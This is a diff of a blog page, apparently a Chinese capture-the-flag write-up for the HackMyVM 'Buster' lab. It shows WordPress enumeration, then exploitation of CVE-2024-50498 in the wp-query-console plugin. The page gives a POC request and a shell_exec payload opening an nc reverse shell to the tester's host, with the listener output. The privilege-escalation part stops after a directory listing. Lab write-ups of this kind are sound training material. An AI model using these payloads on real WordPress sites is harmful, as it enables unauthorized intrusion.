@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://ON9K.github.io/p/buster/'>
 
-<link rel="stylesheet" href="/scss/style.min.8d614abf59ba95b6e4bfd3186bdc95329d30599efc02a732011edc78907ee958.css"><meta property='og:title' content="Buster">
+<link rel="stylesheet" href="/scss/style.min.b0e76e98cdd4f7082d1fc36f7af7e0843a81201db2197c03ca426751dc923735.css"><meta property='og:title' content="Buster">
 <meta property='og:description' content="hackmymv_buster 难度：easy\n目标IP：10.0.2.11\n本机ip：10.0.2.15\n信息收集 nmap扫描目标开开放端口\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(root㉿kali)-[~] └─# nmap 10.0.2.11 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 11:00 EST Nmap scan report for 10.0.2.11 Host is up (0.00056s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: 08:00:27:96:A0:1B (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds 发现开放22端口与80端口,去80端口看看网页\n">
 <meta property='og:url' content='https://ON9K.github.io/p/buster/'>
 <meta property='og:site_name' content='ON9K'>
@@ -269,8 +269,10 @@
             <li><a href="#发现用户">发现用户</a></li>
           </ol>
         </li>
+        <li><a href="#利用漏洞">利用漏洞</a></li>
       </ol>
     </li>
+    <li><a href="#提权">提权</a></li>
   </ol>
 </nav>
         </div>
@@ -347,7 +349,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 2 分钟
+                    阅读时长: 3 分钟
                 </time>
             </div>
         
@@ -647,7 +649,8 @@
 </span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://10.0.2.11/wp-content/plugins/wp-query-console/README.txt
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h4 id="发现用户">发现用户
+</div><p>存在插件：akismet、feed、wp-query-console</p>
+<h4 id="发现用户">发现用户
 </h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -680,7 +683,166 @@
 </span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>存在用户ta0、welcome</p>
+<h3 id="利用漏洞">利用漏洞
+</h3><p>搜索插件wp-query-console发现存在RCE漏洞（CVE-2024-50498），且存在页面10.0.2.11/wp-json/wqc/v1/query</p>
+<p><img src="/p/buster/index.assets/image-20251201003916037.png"
+	width="2259"
+	height="387"
+	srcset="/p/buster/index.assets/image-20251201003916037_hu_5ebebd72aae41fc4.png 480w, /p/buster/index.assets/image-20251201003916037_hu_30f9880be04c51d2.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251201003916037"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="583"
+		data-flex-basis="1400px"
+	
+></p>
+<p>查看POC</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">POST /wp-json/wqc/v1/query HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: kubernetes.docker.internal
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Content-Length: 45
+</span></span><span class="line"><span class="cl">Origin: http://kubernetes.docker.internal
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Priority: u=0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{&#34;queryArgs&#34;:&#34;phpinfo();&#34;,&#34;queryType&#34;:&#34;post&#34;}
+</span></span></code></pre></td></tr></table>
 </div>
+</div><p>利用bp抓包修改参数</p>
+<p><img src="/p/buster/index.assets/image-20251201004227636.png"
+	width="1599"
+	height="900"
+	srcset="/p/buster/index.assets/image-20251201004227636_hu_21503b99d1720c1e.png 480w, /p/buster/index.assets/image-20251201004227636_hu_a3b6a50541b25503.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251201004227636"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="426px"
+	
+></p>
+<p>验证漏洞存在，修改命令函数反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;queryArgs&#34;</span>:<span class="s2">&#34;shell_exec(&#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.2.15 4444 &gt;/tmp/f&#39;);&#34;</span>,<span class="s2">&#34;queryType&#34;</span>:<span class="s2">&#34;post&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/reverse<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lnvp <span class="m">4444</span> 
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.0.2.15<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.11<span class="o">]</span> <span class="m">55216</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ /usr/bin/script -qc /bin/bash /dev/null
+</span></span><span class="line"><span class="cl">www-data@listen:~/html/wordpress$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="提权">提权
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@listen:~/html/wordpress$ ls -al
+</span></span><span class="line"><span class="cl">ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">248</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">5</span> www-data www-data  <span class="m">4096</span> Jan  <span class="m">8</span>  <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root     root      <span class="m">4096</span> Jan  <span class="m">7</span>  <span class="m">2025</span> ..
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data   <span class="m">405</span> Jan  <span class="m">8</span>  <span class="m">2025</span> index.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data <span class="m">19915</span> Dec <span class="m">31</span>  <span class="m">2023</span> license.txt
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">7409</span> Jun <span class="m">18</span>  <span class="m">2024</span> readme.html
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root     root       <span class="m">684</span> Jan  <span class="m">8</span>  <span class="m">2025</span> update_url.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">7387</span> Feb <span class="m">13</span>  <span class="m">2024</span> wp-activate.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">9</span> www-data www-data  <span class="m">4096</span> Nov <span class="m">21</span>  <span class="m">2024</span> wp-admin
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data   <span class="m">351</span> Feb  <span class="m">6</span>  <span class="m">2020</span> wp-blog-header.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">2323</span> Jun <span class="m">14</span>  <span class="m">2023</span> wp-comments-post.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">3336</span> Oct <span class="m">15</span>  <span class="m">2024</span> wp-config-sample.php
+</span></span><span class="line"><span class="cl">-rw-rw-rw-  <span class="m">1</span> www-data www-data  <span class="m">3620</span> Jan  <span class="m">8</span>  <span class="m">2025</span> wp-config.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">6</span> www-data www-data  <span class="m">4096</span> Jan  <span class="m">8</span>  <span class="m">2025</span> wp-content
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">5617</span> Aug  <span class="m">2</span>  <span class="m">2024</span> wp-cron.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">30</span> www-data www-data <span class="m">12288</span> Nov <span class="m">21</span>  <span class="m">2024</span> wp-includes
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">2502</span> Nov <span class="m">26</span>  <span class="m">2022</span> wp-links-opml.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">3937</span> Mar <span class="m">11</span>  <span class="m">2024</span> wp-load.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data <span class="m">51367</span> Sep <span class="m">30</span>  <span class="m">2024</span> wp-login.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">8543</span> Sep <span class="m">18</span>  <span class="m">2024</span> wp-mail.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data <span class="m">29032</span> Sep <span class="m">30</span>  <span class="m">2024</span> wp-settings.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data <span class="m">34385</span> Jun <span class="m">19</span>  <span class="m">2023</span> wp-signup.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">5102</span> Oct <span class="m">18</span>  <span class="m">2024</span> wp-trackback.php
+</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> www-data www-data  <span class="m">3246</span> Mar  <span class="m">2</span>  <span class="m">2024</span> xmlrpc.php
+</span></span><span class="line"><span class="cl">www-data@listen:~/html/wordpress$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现存在wp-config.php为配置文件，查看该文件</p>
+
 </section>
 
 
